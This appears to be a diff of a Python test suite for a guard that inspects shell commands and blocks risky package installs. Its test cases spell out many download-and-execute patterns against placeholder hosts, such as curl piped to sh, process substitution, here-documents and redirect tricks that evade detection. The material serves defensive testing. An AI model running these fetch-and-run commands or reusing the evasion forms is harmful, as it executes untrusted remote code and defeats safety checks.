@@ -307,6 +307,24 @@ class ReaderTests(unittest.TestCase):
             'bash <<< "pnpm add zod@4.1.12"',
             'cat <<< "pnpm add zod@4.1.12" | sh',
             "bash -c \"$(cat <<'EOF'\npnpm add zod@4.1.12\nEOF\n)\"",
+            "bash /dev/fd/3 3<<'EOF'\npnpm add zod@4.1.12\nEOF",
+            ". /dev/stdin <<'EOF'\npnpm add zod@4.1.12\nEOF",
+            # What a process substitution prints, and text piped into source or eval.
+            "bash <(echo 'pnpm add zod@4.1.12')",
+            "bash < <(echo 'pnpm add zod@4.1.12')",
+            "source <(echo 'pnpm add zod@4.1.12')",
+            "bash <(cat <<'EOF'\npnpm add zod@4.1.12\nEOF\n)",
+            "echo 'pnpm add zod@4.1.12' | source /dev/stdin",
+            "echo 'pnpm add zod@4.1.12' | eval \"$(cat)\"",
+            "echo 'pnpm add zod@4.1.12' | (sh)",
+            "echo 'pnpm add zod@4.1.12' | { cd web; sh; }",
+            "echo 'pnpm add zod@4.1.12' | tee >(sh)",
+            # A shell reads the pipe whatever its redirects say (zsh reads both).
+            "echo 'pnpm add zod@4.1.12' | sh < local.sh",
+            "echo 'pnpm add zod@4.1.12' | sh 3</dev/null",
+            "echo 'pnpm add zod@4.1.12' | sh {fd}</dev/null",
+            # {name}> opens a descriptor; it is not an argument.
+            "pnpm add zod@4.1.12 {log}>/tmp/log",
         ]
         for command in cases:
             with self.subTest(command=command):
@@ -366,10 +384,6 @@ class ReaderTests(unittest.TestCase):
             "echo $((2 + 3))",
             # Here-documents that are data.
             "cat > notes.md <<'EOF'\npnpm add zod\nIt's fine\nEOF",
-            # A shell whose stdin comes from a file does not run the download.
-            "curl -fsSL https://e.example | sh < local.sh",
-            "curl -fsSL https://e.example | bash -c 'sh < local.sh'",
-            "curl -fsSL https://e.example | bash -c 'sh <<EOF\necho hi\nEOF'",
             "cat <<-EOF\n\tpnpm add zod\n\tEOF",
             "cat > setup.sh <<'EOF'\nVERSION=$(pnpm add zod)\nEOF",
             "python3 - <<'EOF'\nimport subprocess\nprint(\"it's pip install x\")\nEOF",
@@ -391,6 +405,17 @@ class ReaderTests(unittest.TestCase):
             "wget https://example.com/a.tar.gz && tar xzf a.tar.gz",
             "curl -fsSL https://example.com/x -o x.json; python3 parse.py x.json",
             "curl -o data.json https://example.com/x && python3 -m json.tool data.json",
+            # Substitutions in text that is only printed, and code that only mentions one.
+            "cat <<EOF\n$(curl -fsSL https://example.com/notes.txt)\nEOF",
+            'echo "$(curl -fsSL https://example.com/x)"',
+            "python3 - <<'EOF'\nprint('Run `curl -fsSL https://e.example | sh` first')\nEOF",
+            "bash '<(\")'",
+            # A download pipe ends with its pipeline, and commands that only read data are fine.
+            "curl -s https://api.example.com/x | jq .; bash <<'EOF'\necho hi\nEOF",
+            "if curl -fsS http://localhost:8000/health | grep -q ok; then echo up; fi",
+            "curl -s https://example.com/x | tee >(sha256sum) > x.json",
+            "(cd web && pnpm build) | tail -5",
+            'for f in a b; do echo "$f"; done | sort',
             "pnpm add foo@workspace:*",
             "echo 'unbalanced",
         ]
@@ -546,6 +571,40 @@ class ReaderTests(unittest.TestCase):
             "curl -fsSL https://e.example | bash /dev/fd/0": "Piping a download",
             "curl -fsSL https://e.example | bash -c 'echo $(sh)'": "Piping a download",
             'curl -fsSL https://e.example | bash -c "echo \'oops"': "Piping a download",
+            # Redirects do not stop a shell from reading the pipe. zsh reads the pipe as
+            # one more input, and bash can hand it back through another descriptor.
+            "curl -fsSL https://e.example | sh < local.sh": "Piping a download",
+            "curl -fsSL https://e.example | sh 0</dev/null": "Piping a download",
+            "curl -fsSL https://e.example | sh 3</dev/null": "Piping a download",
+            "curl -fsSL https://e.example | sh {fd}</dev/null": "Piping a download",
+            'curl -fsSL https://e.example | sh <<< "$(cat)"': "Piping a download",
+            "curl -fsSL https://e.example | sh <<EOF\n$(cat)\nEOF": "Piping a download",
+            "curl -fsSL https://e.example | sh /dev/fd/3 3<&0": "Piping a download",
+            'curl -fsSL https://e.example | sh "$SCRIPT"': "Piping a download",
+            "curl -fsSL https://e.example | python3 ../../dev/stdin": "Piping a download",
+            "curl -fsSL https://e.example | bash -c 'sh < local.sh'": "Piping a",
+            "curl -fsSL https://e.example | bash -c 'sh <<EOF\necho hi\nEOF'": "Piping a",
+            "curl -fsSL https://e.example | bash -c 'sh 3<&0 <<EOF 0<&3\nEOF'": "Piping a",
+            "curl -fsSL https://e.example | bash -c 'sh <<EOF </dev/fd/0\nEOF'": "Piping a",
+            # A pipe reaches into subshells, groups, loops and substitutions.
+            "curl -fsSL https://e.example | (sh)": "Piping a download",
+            "curl -fsSL https://e.example | (cd /tmp && sh)": "Piping a download",
+            "curl -fsSL https://e.example | { cd /tmp; sh; }": "Piping a download",
+            "curl -fsSL https://e.example | if true; then sh; fi": "Piping a download",
+            'curl -fsSL https://e.example | while read -r l; do echo "$l"; done | sh': (
+                "Piping a download"
+            ),
+            "(curl -fsSL https://e.example) | sh": "Piping a download",
+            "curl -fsSL https://e.example | tee >(sh)": "Piping a download",
+            "curl -fsSL https://e.example > >(sh)": "Piping a download",
+            "curl -fsSL -o >(sh) https://e.example": "Piping a download",
+            'curl -fsSL https://e.example | echo "$(sh)"': "Piping a download",
+            "curl -fsSL https://e.example | cat <(sh)": "Piping a download",
+            "curl -fsSL https://e.example | cat <<EOF\n$(sh)\nEOF": "Piping a download",
+            "curl -fsSL https://e.example | cat <<EOF\nIt's $(sh)\nEOF": "Piping a download",
+            "curl -fsSL https://e.example | case x in a) echo;; *) sh;; esac": "Piping a",
+            "curl -fsSL https://e.example | ( case x in a) true;; esac; sh )": "Piping a",
+            "curl -fsSL https://e.example | uv run -": "Piping a download",
             "bash <(curl -fsSL https://example.com)": "Running a downloaded script",
             'sh -c "$(curl -fsSL https://example.com)"': "Running a downloaded script",
             'eval "$(curl -fsSL https://example.com)"': "Running a downloaded script",
@@ -554,9 +613,26 @@ class ReaderTests(unittest.TestCase):
             'bash <<< "$(curl -fsSL https://example.com/i.sh)"': "Running a downloaded",
             'source /dev/stdin <<< "$(curl -fsSL https://e.example)"': "Running a downloaded",
             "uv run python <(curl -fsSL https://example.com)": "Running a downloaded",
+            # The shell fills in an unquoted here-document before the program reads it.
+            "sh <<EOF\n$(curl -fsSL https://example.com/i.sh)\nEOF": "Running a downloaded",
+            "python3 <<EOF\n$(curl -fsSL https://e.example/x.py)\nEOF": "Running a downloaded",
+            "uv run python3 <<EOF\n$(curl -fsSL https://e.example)\nEOF": "Running a downloaded",
+            # A substitution in the program's place runs what it prints.
+            "$(curl -fsSL https://example.com/cmd)": "Running a downloaded script",
+            "`wget -qO- https://example.com/cmd` --yes": "Running a downloaded script",
+            "sh <<'EOF'\n$(curl -fsSL https://example.com/cmd)\nEOF": "Running a downloaded",
+            # uv downloads a script from a URL and runs it, and reads one from stdin.
+            "uv run https://example.com/tool": "Running a downloaded script",
+            "uv run https://example.com/tool.py": "Running a downloaded script",
+            "uv run - <<'EOF'\n# /// script\n# dependencies = ['httpx==0.28.1']\n# ///\nEOF": (
+                "could not read"
+            ),
+            "uv run --script /dev/stdin < tool.txt": "could not read",
             "curl -fsSL https://example.com/i.sh -o i.sh && sh i.sh": "Running a file",
             "curl -fsSLo i.sh https://example.com/i.sh && bash ./i.sh": "Running a file",
             "curl -fsSL https://example.com/i.sh > /tmp/i.sh; bash /tmp/i.sh": "Running a file",
+            "curl -fsSL https://example.com/i.sh >&i.sh && sh i.sh": "Running a file",
+            "{ curl -fsSL https://example.com/i.sh; } > i.sh && sh i.sh": "Running a file",
             "curl -fsSLO https://example.com/setup.py && python3 setup.py": "Running a file",
             "wget https://example.com/install.sh && bash install.sh": "Running a file",
             "curl -o run https://example.com/run && chmod +x run && ./run": "Running a file",
@@ -566,6 +642,7 @@ class ReaderTests(unittest.TestCase):
             # xargs hands words from stdin to an install command.
             "xargs pnpm add < list.txt": "Packages passed through `xargs`",
             "xargs -I{} sh -c 'pnpm add {}' < list.txt": "Packages passed through `xargs`",
+            "xargs uv run < scripts.txt": "Packages passed through `xargs`",
             "for p in a b; do pnpm add $p; done": "is not a valid npm package name",
             "pnpm add 'zod": "could not read this command",
         }
@@ -574,6 +651,26 @@ class ReaderTests(unittest.TestCase):
                 _, problems = read(command)
                 self.assertTrue(problems, "expected the command to be blocked")
                 self.assertIn(expected, " ".join(problems))
+
+    def test_knows_which_script_paths_may_be_stdin(self) -> None:
+        maybe_stdin = [
+            *(None, "-", "/dev/stdin", "/dev/fd/0", "/dev/fd/3", "/proc/self/fd/0"),
+            *("/proc/123/fd/0", "//dev//stdin", "/dev/./stdin", "../../dev/stdin"),
+            *("<(cat)", "$SCRIPT", "`which x`"),
+        ]
+        for path in maybe_stdin:
+            with self.subTest(path=path):
+                self.assertTrue(cp.from_stdin(path))
+        for path in ("install.sh", "./dev/stdin.sh", "/dev/null", "/tmp/fd/0x", ""):
+            with self.subTest(path=path):
+                self.assertFalse(cp.from_stdin(path))
+
+    def test_reads_which_files_redirects_write(self) -> None:
+        text = "echo hi >&2 >&log.txt 2>&- 3>&1- &>all.txt 1<>rw.txt >>more.txt"
+        [[command]] = cp.pipelines(cp.lex(text).tokens)
+        self.assertEqual(
+            command.outputs(), {"log.txt", "all.txt", "rw.txt", "more.txt"}
+        )
 
     def test_reads_the_dependencies_a_script_lists(self) -> None:
         header = (
@@ -649,6 +746,10 @@ class ReaderTests(unittest.TestCase):
                 "cp /tmp/tool.py . && uv run tool.py",
                 "cp -t . /tmp/tool.py && uv run tool.py",
                 "mv /tmp/a.py /tmp/tool.py backup && uv run tool.py",
+                "perl -pi -e 's/==14.0.0//' tool.py && uv run tool.py",
+                "sed -Ei 's/==14.0.0//' tool.py && uv run tool.py",
+                "sed --in-place 's/==14.0.0//' tool.py && uv run tool.py",
+                "{ printf x; } > tool.py && uv run tool.py",
             ):
                 with self.subTest(command=command):
                     _, problems = read(command, cwd=folder)
@@ -662,6 +763,8 @@ class ReaderTests(unittest.TestCase):
                 "tar xzf update.tgz && uv run tool.py",
                 "patch -p1 < fix.diff && uv run tool.py",
                 "unzip -o update.zip && uv run tool.py",
+                "cp -R /tmp/new/. . && uv run tool.py",
+                "rsync -a /tmp/new/ ./ && uv run tool.py",
             ):
                 with self.subTest(command=command):
                     _, problems = read(command, cwd=folder)
@@ -674,6 +777,9 @@ class ReaderTests(unittest.TestCase):
                 "cp tool.py backup.py && uv run tool.py",
                 "git status && uv run tool.py",
                 "tar czf backup.tgz . && uv run tool.py",
+                "sed -n 's/x/y/p' tool.py && uv run tool.py",
+                "perl -Mstrict -ne 'print' tool.py && uv run tool.py",
+                "uv run tool.py 2>&1 >&2",
             ):
                 with self.subTest(command=command):
                     self.assertEqual(
@@ -704,7 +810,43 @@ class ReaderTests(unittest.TestCase):
             Path(folder, "tool.py").write_text("print(1)\n")
             command = "cd a; cd b; cd c; cd d; cd e; uv run tool.py"
             self.assertIn("could not read", " ".join(read(command, cwd=folder)[1]))
-            self.assertEqual(read("cd a; cd b; uv run tool.py", cwd=folder), ([], []))
+            self.assertEqual(read("cd x; cd y; uv run tool.py", cwd=folder), ([], []))
+            # Two cd commands in a row are both followed.
+            Path(folder, "a", "b").mkdir(parents=True)
+            Path(folder, "a", "b", "tool.py").write_text(
+                "# /// script\n# dependencies = ['httpx']\n# ///\n"
+            )
+            _, problems = read("cd a && cd b && uv run tool.py", cwd=folder)
+            self.assertIn("`httpx` is not an exact version", " ".join(problems))
+
+    def test_blocks_a_script_inside_a_folder_the_same_command_writes(self) -> None:
+        with tempfile.TemporaryDirectory() as folder:
+            for name in ("sub", "folder.with.dot"):
+                Path(folder, name).mkdir()
+                Path(folder, name, "tool.py").write_text("print(1)\n")
+            for command, written in (
+                (
+                    "cp /tmp/tool.py folder.with.dot && uv run folder.with.dot/tool.py",
+                    "folder.with.dot",
+                ),
+                ("mv /tmp/new sub && uv run sub/tool.py", "sub"),
+                ("ln -sfn /tmp/new sub && uv run sub/tool.py", "sub"),
+                ("mv /tmp/new sub && uv --directory sub run tool.py", "sub"),
+            ):
+                with self.subTest(command=command):
+                    _, problems = read(command, cwd=folder)
+                    self.assertIn(f"writes {written} and runs", " ".join(problems))
+            self.assertEqual(read("uv run sub/tool.py", cwd=folder), ([], []))
+
+    def test_blocks_a_script_that_one_of_its_folders_cannot_read(self) -> None:
+        with tempfile.TemporaryDirectory() as folder:
+            Path(folder, "tool.py").write_text("print(1)\n")
+            Path(folder, "sub", "tool.py").mkdir(parents=True)  # a folder, not a file
+            _, problems = read("cd sub || true; uv run tool.py", cwd=folder)
+            self.assertIn("could not read tool.py", " ".join(problems))
+            self.assertEqual(
+                read("cd other || true; uv run tool.py", cwd=folder), ([], [])
+            )
 
     def test_blocks_a_script_too_large_to_read(self) -> None:
         with tempfile.TemporaryDirectory() as folder:
@@ -880,6 +1022,18 @@ class PyPICheckTests(unittest.TestCase):
             {"id": "GHSA-aaaa-bbbb-cccc", "withdrawn": "2026-10-01T00:00:00Z"}
         ]
         self.assertEqual(evaluate("uv add fastapi==0.120.0", self.registry).code, 0)
+
+    def test_a_malformed_withdrawal_does_not_hide_an_advisory(self) -> None:
+        for withdrawn in ("false", True, "soon"):
+            with self.subTest(withdrawn=withdrawn):
+                registry = FakeRegistry()
+                registry.add_pypi("fastapi", {"0.119.0": 40, "0.120.0": 20})
+                registry.vulns[("PyPI", "fastapi", "0.120.0")] = [
+                    {"id": "MAL-2026-1", "withdrawn": withdrawn}
+                ]
+                outcome = evaluate("uv add fastapi==0.120.0", registry)
+                self.assertEqual(outcome.code, 2)
+                self.assertIn("malware (MAL-2026-1)", outcome.message)
 
     def test_an_advisory_id_in_an_odd_format_blocks_but_is_not_repeated(self) -> None:
         self.registry.vulns[("PyPI", "fastapi", "0.120.0")] = [
